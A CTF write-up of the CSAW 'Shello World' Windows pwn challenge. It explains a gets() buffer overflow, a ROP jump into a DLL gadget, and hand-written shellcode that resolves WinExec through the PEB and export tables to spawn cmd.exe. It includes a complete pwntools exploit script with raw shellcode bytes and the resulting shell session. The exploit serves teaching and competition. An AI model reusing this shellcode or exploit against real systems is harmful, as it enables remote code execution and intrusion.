# Shello World
**Binary Exploitation (pwn) - 471pts**

Description:
```
Write your first Windows shellcode!

nc win.chal.csaw.io 7778
```

Hints:
```
The flag is in C:\chal\flag.txt.
```

# Table of Contents
1. [Working with Windows](#Windows)
2. [Discovery](#Discovery)
3. [Plagiarism is *Still* Easier](#Plagiarism)
4. [Finding `kernel32.dll`](#Kernel)
5. [Finding `WinExec` using Tables](#WinExec)
6. [Popping a Shell](#Shell)
7. [Getting the Flag](#Flag)
8. [TL;DR](#tldr)

## Working with Windows <a name="Windows"></a>

This challenge gave us a `.exe` file, a `.dll` file, a Docker container, and socat (Socket Cat) portable.

Wine, for Linux, is usually a hassle and I never have good luck with it. Luckily, for development reasons, my laptop is a dualboot with Windows, so we have to go set up a pwn-ing environment real quick.

Everything is done through powershell since it feels marginally better than `cmd`.

I ended up using socat to run the program, so I have a process to "connect" to. It can be ran like so:

```powershell
PS> ./socat.exe TCP-LISTEN:7778,reuseaddr,fork exec:./ShelloWorld.exe,pty,ctty,echo=0
```

From there I installed my standard tools that I use, Cutter, Python, pwntools.

Finally, I got a debugger for windows programs, I used [x64dbg](https://x64dbg.com/) (specifically, x32dbg). My process was to run my exploit, pause, then attach onto the pid in x32dbg. Our skeleton pwntools script would look like:

```py
from pwn import *
r = remote("127.0.0.1", 7778)

pause()
r.recvuntil('>')
```

With that all set up, we can start looking at the binary.

## Discovery <a name="Discovery"></a>

Running the binary gives us a little intro about Windows, notes that it's running Windows Server 2019 LTS, and expects shellcode from us. Also, popping a shell is async, so we have to make the process idle after doing so (more on this later).

If you don't know what shellcode is, go to my [Two's Compliment](https://github.com/Surg-Dev/writeups/blob/master/Cybergames2021/Two's%20Compliment.md) writeup, I'm going to make some basic assumptions about our goals here.

In this case, we're trying to call `WinExec` with the parameter `C:\Windows\System32\cmd.exe` to get a shell.

What is `WinExec`? It's a kernel wrapper function that lives in `kernel32.dll` that acts very similar to `execve` on linux.

Let's look at the `.exe` file first:

There's a few challenge hosting functions that aren't really relevant. Our main function calls RunChallenge, which prints out the intro text, then calls `_Vuln`:


```c
void _Vuln(void)
{
    undefined4 uVar1;
    int32_t in_stack_fffffde8;
    char *s;
    char buf [500];
    
    // void Vuln();
    _printf((int32_t)"Okay, give me some input!\n\n> ", in_stack_fffffde8);
    uVar1 = (**(code **)0x40904c)(1);
    _fflush(uVar1);
    _gets(&s);
    _printf((int32_t)"Thanks for playing...\n", in_stack_fffffde8);
    uVar1 = (**(code **)0x40904c)(1);
    _fflush(uVar1);
    return;
}
```

Our friend the `gets` function. To double check that this works alright, I found a [checksec](https://github.com/Wenzel/checksec.py/releases/tag/v0.6.2) for Windows. All important binary security features are off, we have an executable stack, no canary, no randomization that matters, and so on.

At this point, I can see that this will be a simple buffer overflow, with a bit of ROPing to our code.

Lets look at the given `.dll`:

We have `SuspiciousGadget`:

```c
void _SuspiciousGadget(void)
{
    (*(code *)&stack0xfffffffc)();
    return;
}
```

and `BeKindtoYourCSAWInfraTeam`:

```c

void BeKindToYourCSAWInfraTeam(void)
{
    code **ppcVar1;
    code *pcVar2;
    
    (*_Sleep)(120000);
    (*_ExitProcess)(0);
    /*
        omitted, irrelevant code
    */
}
```

Since there is no randomization, we can jump to these functions directly.

Basically, the start of our pwntools script will look like:

```py
payload = b"A" * 508        # Buffer
payload += p32(0x62101627)  # sleep function
payload += p32(0x62101621)  # shellcode gadget
```

So the idea is that we overflow the buffer and other garbage on the stack, then put on a ROP addresses to the sleep function and our shellcode gadget, which will just return back to the stack.

## Plagiarism is *Still* Easier <a name="Plagiarism"></a>
With my previous shellcode writing, it's usually easier to find someone else who did what you are trying to do and modify it. Googling Windows shellcode brings you to [this writeup](https://idafchev.github.io/exploit/2017/09/26/writing_windows_shellcode.html).

They go through explaining the call structure and the architecture of Windows system calls and APIs. It's a good read. They wrote shellcode and directly executed it in C. I'm going to go through and explain how I modified it to work in our challenge. If you want further explanation on how the kernel32.dll is found, and how we find the WinExec function, **read that writeup**!

## Finding `kernel32.dll` <a name="Kernel"></a>

So apparently, with most security features off you can just *find* `kernel32.dll` without much hassle. Since we need to ROP, it's probably a good idea to follow calling conventions (saving registers, allocating stack), to avoid segfaulting and put our next return address in the right place.

We first start with some standard stack allocation/calling convention:

```asm
push eax ; Save all registers
push ebx
push ecx
push edx
push esi
push edi
push ebp


push ebp ; Establish a new stack frame
mov ebp, esp

sub esp, 18h ; alloc mem on stack
```

We then push the string `WinExec` onto the stack:

```asm
xor esi, esi
push esi			; null termination
push 0x63
pushw 0x6578
push 0x456e6957
mov [ebp-4], esp    ; var4 = "WinExec\x00"
```

Then, we work on finding `kernel32.dll`'s base address. I had originally tried to just hard code it, and it worked while I attached the debugger, but didn't work on remote, and it didn't really work locally either... I had trouble with docker, so I went through all the steps that the writeup did. The advantage is, this is more or less portable for similar level shellcode chals.

```asm
; Find kernel32.dll base address
xor esi, esi			; esi = 0
mov ebx, [fs:0x30 + esi]  	; avoding null bytes
mov ebx, [ebx + 0x0C] 
mov ebx, [ebx + 0x14] 
mov ebx, [ebx]	
mov ebx, [ebx]	
mov ebx, [ebx + 0x10]		; ebx has kernel32 base addr
mov [ebp-8], ebx 		; var8 = kernel32.dll base addr
```

This is all good... let's move on to finding the WinExec address, by pulling up all the of the address tables that we need to iterate through kernel32.dll

## Finding `WinExec` using Tables <a name="WinExec"></a>

```asm
	; Find WinExec address
	mov eax, [ebx + 0x3C]		; RVA of PE signature
	add eax, ebx       		; Address of PE signature = base address + RVA of PE signature
	mov eax, [eax + 0x78]		; RVA of Export Table
	add eax, ebx 			; Address of Export Table

	mov ecx, [eax + 0x24]		; RVA of Ordinal Table
	add ecx, ebx 			; Address of Ordinal Table
	mov [ebp-0x0C], ecx 		; var12 = Address of Ordinal Table

	mov edi, [eax + 0x20] 		; RVA of Name Pointer Table
	add edi, ebx 			; Address of Name Pointer Table
	mov [ebp-0x10], edi 		; var16 = Address of Name Pointer Table

	mov edx, [eax + 0x1C] 		; RVA of Address Table
	add edx, ebx 			; Address of Address Table
	mov [ebp-0x14], edx 		; var20 = Address of Address Table

	mov edx, [eax + 0x14] 		; Number of exported functions

	xor eax, eax 			; counter = 0
```

This is where we run into our first problem...

That `0x1C` byte from `mov edx, [eax + 0x1C]`, for whatever reason, causes `gets()` to not work, and our shellcode doesn't get read. I cannot explain to you the sheer amount of confusion that I had when building this. One moment it was reading the code, the next not. I know that line feeds and whatnot are off the table cause it's `gets()`, but this random *file separator* byte decides to break everything.

So I fiddle with it to avoid using that byte:

```asm
mov esi, eax
add esi, 0x20
dec esi
dec esi
dec esi
dec esi
mov edx, [esi] ; RVA of Address Table
xor esi, esi
```

We then loop through the address table until we find `WinExec`:

```asm
loop: 
    mov edi, [ebp-0x10] ; addr. of Name Ptr Table
    mov esi, [ebp-4] ; WinExec
    xor ecx, ecx

    cld  ; set DF=0 => process strings from left to right
    mov edi, [edi + eax*4]
    add edi, ebx
    add cx, 8
    repe cmpsb  ; esi and edi registers. ZF=1 if equal, ZF=0 if not
    jz found
    inc eax
    cmp eax, edx  ;check if last function reached
    jb loop
    add esp, 0x26  ; reclaim stack
```

Once we found WinExec, we do a bit of math to get the exact pointer:


```asm
found:
    mov ecx, [ebp-0x0C]	; ecx = var12 = Address of Ordinal Table
    mov edx, [ebp-0x14]  	; edx = var20 = Address of Address Table

    mov ax, [ecx + eax*2] 	; ax = ordinal number = var12 + (counter * 2)
    mov eax, [edx + eax*4] 	; eax = RVA of function = var20 + (ordinal * 4)
    add eax, ebx 		; eax = address of WinExec = kernel32.dll base address + RVA of WinExec

    xor edx, edx
```

And yet, another problem! The `0x04` bytes from the compiled `mov    ax,WORD PTR [ecx+eax*2]` and `mov eax, [edx + eax*4]` don't get read by `gets`. It still fills the buffer unlike `0x1c`, but is just absent, which screws up the shell code functionality. Again, a lot of confusion when I would SEE the code get read in properly, but then the commands get offset improperly and becomes a garbled mess.

So again, more fiddling to avoid causing those `0x04` bytes to show up:

```asm
mov esi, ecx
add esi, eax
add esi, eax
mov ax, [esi] ; ax = ordinal number = var12 + (counter * 2)
mov esi, edx
add esi, eax
add esi, eax
add esi, eax
add esi, eax
mov eax, [esi] ; eax = RVA of function = var20 + (ordinal * 4)
xor esi, esi
```

## Popping a Shell <a name="Shell"></a>

First, we load our parameter onto the stack:
```asm
xor edx, edx
push edx         ; null terminator
push 0x20657865
push 0x2e646d63
push 0x5c32336d
push 0x65747379
push 0x535c7377
push 0x6f646e69
push 0x575c3a43 ; "C:\Windows\System32\cmd.exe "
```

The writeup shellcode used `calc.exe` at first, which is interesting that the whole path is divisible by 8, making it a bunch of clean stack pushes. Luckily, windows doesn't give a shit, and I can just use a space (`0x20`) to fill... space.

(Also, remember little endian and stack structure, which is why the bytes are ordered backwards!)

Finally, we call WinExec with our parameters pushed onto the stack

```asm
mov esi, esp		; esi -> "C:\Windows\System32\cmd.exe "

push 10  		; window state SW_SHOWDEFAULT
push esi 		; "C:\Windows\System32\cmd.exe "
call eax 		; WinExec

add esp, 0x46		; clear the stack
ret
```

One last issue, we can't use `0x0a`, cause it causes gets() to stop reading. Luckily, this is just for positioning the window. And since the person who wrote this wanted to work like normal, he used `10`. I can just change this to `1`.

```asm
push 0x01
```

So WinExec gets called with our path and `SW_SHOWNORMAL` window mode. Not that it matters since we're just popping a shell.


## Getting the Flag <a name="Flag"></a>
Because we reclaimed our stack, `ret` will return back to where our address for the sleep function is on the DLL, and return to that and cause the chal process to sleep. Since the shell is async, we need our chal to sleep, or else it will exit causing our connection to exit.

Our final exploit assembly:

```asm
push eax
push ebx
push ecx
push edx
push esi
push edi
push ebp

push ebp
mov ebp, esp
sub esp, 0x18

xor esi, esi
push esi
push 0x63
pushw 0x6578
push 0x456e6957
mov [ebp-4], esp

xor esi, esi
mov ebx, [fs:0x30 + esi]
mov ebx, [ebx + 0x0C] 
mov ebx, [ebx + 0x14] 
mov ebx, [ebx]	
mov ebx, [ebx]	
mov ebx, [ebx + 0x10]
mov [ebp-8], ebx


mov eax, [ebx + 0x3C]
add eax, ebx
mov eax, [eax + 0x78]
add eax, ebx

mov ecx, [eax + 0x24]
add ecx, ebx 
mov [ebp-0x0C], ecx

mov edi, [eax + 0x20]
add edi, ebx
mov [ebp-0x10], edi


mov esi, eax
add esi, 0x20
dec esi
dec esi
dec esi
dec esi
mov edx, [esi]
xor esi, esi
add edx, ebx
mov [ebp-0x14], edx
add eax, 0x14
dec eax
dec eax
mov edx, [eax]

xor eax, eax

loop:
    mov edi, [ebp-0x10]
    mov esi, [ebp-4]
    xor ecx, ecx

    cld 
    mov edi, [edi + eax*4]
    add edi, ebx
    add cx, 8
    repe cmpsb  
    jz found
    inc eax
    cmp eax, edx
    jb loop
    add esp, 0x26  		
found:
    mov ecx, [ebp-0x0C]
    mov edx, [ebp-0x14]
    mov esi, ecx
    add esi, eax
    add esi, eax
    mov ax, [esi]
    mov esi, edx
    add esi, eax
    add esi, eax
    add esi, eax
    add esi, eax
    mov eax, [esi]
    xor esi, esi
    add eax, ebx

xor edx, edx
push edx
push 0x20657865
push 0x2e646d63
push 0x5c32336d
push 0x65747379
push 0x535c7377
push 0x6f646e69
push 0x575c3a43
mov esi, esp
push 0x01
push esi
call eax
add esp, 0x46
ret
```

Our exploit script:
```py
from pwn import *
# r = remote("127.0.0.1", 7778)
r = remote('win.chal.csaw.io', 7778)

# pause()

payload = b"A" * 508        # Buffer
payload += p32(0x62101627)  # sleep function
payload += p32(0x62101621)  # shellcode gadget
# lol
monolith = b'\x50\x53\x51\x52\x56\x57\x55\x55\x89\xE5\x83\xEC\x18\x31\xF6\x56\x6A\x63\x66\x68\x78\x65\x68\x57\x69\x6E\x45\x89\x65\xFC\x31\xF6\x64\x8B\x5E\x30\x8B\x5B\x0C\x8B\x5B\x14\x8B\x1B\x8B\x1B\x8B\x5B\x10\x89\x5D\xF8\x8B\x43\x3C\x01\xD8\x8B\x40\x78\x01\xD8\x8B\x48\x24\x01\xD9\x89\x4D\xF4\x8B\x78\x20\x01\xDF\x89\x7D\xF0\x89\xC6\x83\xC6\x20\x4E\x4E\x4E\x4E\x8B\x16\x31\xF6\x01\xDA\x89\x55\xEC\x83\xC0\x14\x48\x48\x8B\x10\x31\xC0\x8B\x7D\xF0\x8B\x75\xFC\x31\xC9\xFC\x8B\x3C\x87\x01\xDF\x66\x83\xC1\x08\xF3\xA6\x74\x08\x40\x39\xD0\x72\xE5\x83\xC4\x26\x8B\x4D\xF4\x8B\x55\xEC\x89\xCE\x01\xC6\x01\xC6\x66\x8B\x06\x89\xD6\x01\xC6\x01\xC6\x01\xC6\x01\xC6\x8B\x06\x31\xF6\x01\xD8\x31\xD2\x52\x68\x65\x78\x65\x20\x68\x63\x6D\x64\x2E\x68\x6D\x33\x32\x5C\x68\x79\x73\x74\x65\x68\x77\x73\x5C\x53\x68\x69\x6E\x64\x6F\x68\x43\x3A\x5C\x57\x89\xE6\x6A\x01\x56\xFF\xD0\x83\xC4\x46\xC3'
payload += monolith


r.recvuntil('>')
r.sendline(payload)
r.interactive()
```

Running it on remote gives us a shell, and we can read the flag!

```
[*] Switching to interactive mode
 Thanks for playing...
Microsoft Windows [Version 10.0.17763.3287]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\>cd chal
cd chal

C:\chal>
C:\chal>more flag.txt
more flag.txt
flag{I_w4nt3d_t0_j01n_y0ur_T34ms_p4rty_but_1_h4d_t0_jump_t0_4n0th3r_funct10n}

C:\chal>
C:\chal>
```

Neat! A lot of the same principals as regular shellcode, but needs extra work to get access to our kernel level syscalls.

It was the 8th solve at the time, and so then after 6 or 7 hours of work, I submitted the flag at 6am CST and promptly went to bed.

## TL;DR <a name="tldr"></a>
Use some windows shellcode from online, adapt it for it being read rather than compiled in a C file. Place it in a exploit script and run it.

\- Surg